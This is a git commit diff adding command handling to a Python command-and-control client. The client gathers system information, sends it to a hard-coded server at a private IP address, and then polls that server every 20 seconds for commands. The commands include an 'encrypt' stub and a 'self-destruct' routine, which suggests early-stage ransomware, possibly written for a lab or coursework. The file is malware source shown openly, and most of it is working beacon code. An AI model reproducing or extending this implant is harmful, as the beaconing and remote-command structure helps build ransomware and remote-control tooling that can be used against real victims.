18231c9a1d4c828d29fc32f5854af31535b54aab
d-tang9 <dtang9@live.com>
2024-10-01 19:29:52 -0400

    added command handling

--- c2.py
+++ c2.py
@@ -1,15 +1,20 @@
-from functions.c2_functions import get_sysinfo, first_checkin
+from functions.c2_functions import get_sysinfo, first_checkin, run_command, persistent_checkin
 
 SERVER_URL = "http://192.168.91.10:5000/checkin"
 
 def c2():
     sysinfo = get_sysinfo()
     print(f"info before sending: {sysinfo}")
-    first_response = first_checkin(SERVER_URL, sysinfo)
+    if first_checkin(SERVER_URL, sysinfo):
+        print("Connected")
+        persistent_checkin(SERVER_URL, sysinfo, 20)
+    else:
+        print("Error")
+    # first_response = first_checkin(SERVER_URL, sysinfo)
 
-    if not first_response:
-        print("Failed?")
-        return
+    # if not first_response:
+    #     print("Failed?")
+    #     return
     
 if __name__ == "__main__":
     c2()
--- functions/c2_functions.py
+++ functions/c2_functions.py
@@ -5,6 +5,7 @@ import socket
 import json
 import subprocess
 import requests
+from functions.shared import self_destruct
 
 def get_sysinfo():
     """ return sys information """
@@ -30,3 +31,33 @@ def first_checkin(SERVER_URL, json_info):
     except:
         print("Error")
         return False
+    
+def run_command(command):
+    """ Checks response from server for command and then run based on it """
+    print(f"The command is {command}")
+
+    if command == "encrypt":
+        print("Encrypting files")
+    elif command == "self-destruct":
+        self_destruct()
+    else:
+        print("Still haven't implemented")
+
+def persistent_checkin(SERVER_URL, json_info, interval):
+    """ Check in with the c2 server continuously """
+    while True:
+        try:
+            response = requests.post(SERVER_URL, json=json_info)
+            if response.status_code == 200:
+                cmd_response = response.json()
+                cmd = cmd_response.get("command", None)
+                if cmd and cmd != "None":
+                    run_command(cmd)
+                else:
+                    print("No new command")
+            else:
+                print(f"Failed, {response.status_code} - {response.text}")
+        except:
+            print("Failed!")
+
+        time.sleep(interval)
